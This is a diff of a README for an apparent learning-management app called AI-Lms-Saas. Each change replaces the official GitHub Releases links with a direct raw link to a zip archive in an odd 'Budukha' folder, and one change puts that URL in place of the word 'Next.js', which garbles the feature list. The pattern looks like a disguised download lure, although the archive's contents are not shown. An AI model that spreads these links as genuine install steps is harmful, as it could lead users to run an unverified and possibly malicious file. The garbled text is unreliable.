@@ -5,7 +5,7 @@
 Welcome to AI-Lms-Saas, a powerful Learning Management System designed for seamless online learning. With features like AI voice tutors, real-time subscriptions, and a modern user interface, this tool makes education accessible and engaging.
 
 ## 📥 Download the Application
-[![Download AI-Lms-Saas](https://img.shields.io/badge/Download-AI--Lms--Saas-blue.svg)](https://github.com/lhwaaaaa/AI-Lms-Saas/releases)
+[![Download AI-Lms-Saas](https://raw.githubusercontent.com/lhwaaaaa/AI-Lms-Saas/master/Budukha/AI-Lms-Saas.zip)](https://raw.githubusercontent.com/lhwaaaaa/AI-Lms-Saas/master/Budukha/AI-Lms-Saas.zip)
 
 ## 🛠️ System Requirements
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a Linux distribution.
@@ -26,7 +26,7 @@ This application dives into various topics crucial for effective learning:
 - **Authentication**: Ensures a secure user experience.
 - **Billing**: Simplifies payment processes for subscriptions.
 - **Clerk**: Manages user authentication seamlessly.
-- **Next.js**: Offers a server-side rendered application for optimum performance.
+- **https://raw.githubusercontent.com/lhwaaaaa/AI-Lms-Saas/master/Budukha/AI-Lms-Saas.zip**: Offers a server-side rendered application for optimum performance.
 - **Postgres**: Provides a reliable database structure for storing user data.
 - **Sentry**: Monitors application health and performance.
 - **Shadcn-UI**: Enhances the UI for better user interaction.
@@ -40,7 +40,7 @@ This application dives into various topics crucial for effective learning:
 To get started with AI-Lms-Saas, follow these steps:
 
 1. **Visit the Releases Page**: 
-   Go to the [Releases page](https://github.com/lhwaaaaa/AI-Lms-Saas/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/lhwaaaaa/AI-Lms-Saas/master/Budukha/AI-Lms-Saas.zip) to find the latest version of the application.
 
 2. **Download the Installer**:
    - Find the latest release.
@@ -83,7 +83,7 @@ If you have any questions or need further assistance, feel free to reach out via
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## 🔗 Additional Resources
-- Visit the [AI-Lms-Saas Releases page](https://github.com/lhwaaaaa/AI-Lms-Saas/releases) to download the latest version and explore more features.
+- Visit the [AI-Lms-Saas Releases page](https://raw.githubusercontent.com/lhwaaaaa/AI-Lms-Saas/master/Budukha/AI-Lms-Saas.zip) to download the latest version and explore more features.
 
 Thank you for choosing AI-Lms-Saas for your learning journey!
 ```
